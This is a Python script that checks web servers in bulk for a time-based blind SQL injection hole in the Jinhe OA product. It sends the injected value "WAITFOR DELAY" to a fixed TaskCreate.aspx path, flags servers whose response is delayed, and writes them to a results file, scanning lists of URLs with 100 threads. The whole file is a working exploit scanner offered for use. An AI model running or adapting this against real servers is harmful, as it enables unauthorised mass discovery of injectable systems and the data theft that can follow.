import requests,argparse,sys
from multiprocessing.dummy import Pool

def poc(target):
    target = target.strip()
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target    
    payload="/c6/Jhsoft.Web.dailytaskmanage/TaskCreate.aspx/"
    data="taskID=1;WAITFOR DELAY '0:0:5'--"
    header= {
        'Content-Length': '35',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Connection': 'close'
    }
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target

    re1=requests.get(url=target,timeout=5)
    try:
        if re1.status_code==200:
            re2=requests.post(url=target+payload,data=data,headers=header)

            print(re1.elapsed.total_seconds(),re2.elapsed.total_seconds())
            print(re2.elapsed.total_seconds() - re1.elapsed.total_seconds())

            if re2.elapsed.total_seconds()>=5 and re2.elapsed.total_seconds() - re1.elapsed.total_seconds() >=5:
                print(f"[+]该网站{target}存在sql漏洞")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write('金和sql'+target+'\n')
            else:
                print(f"[-]该网站{target}不存在sql漏洞")
        else:
            print(f"[*]该网站{target}访问有问题")
    except:
        pass

def main():
    
    parse = argparse.ArgumentParser(description="金和sql注入漏洞 时间盲注")

    parse.add_argument('-u','--url',type=str,dest='url',help='输入url测试')
    parse.add_argument('-file','--file',type=str,dest='file',help='输入url文件测试')

    args =parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp=Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Python {sys.argv[0]} ")
            
    
if __name__=='__main__':
    main()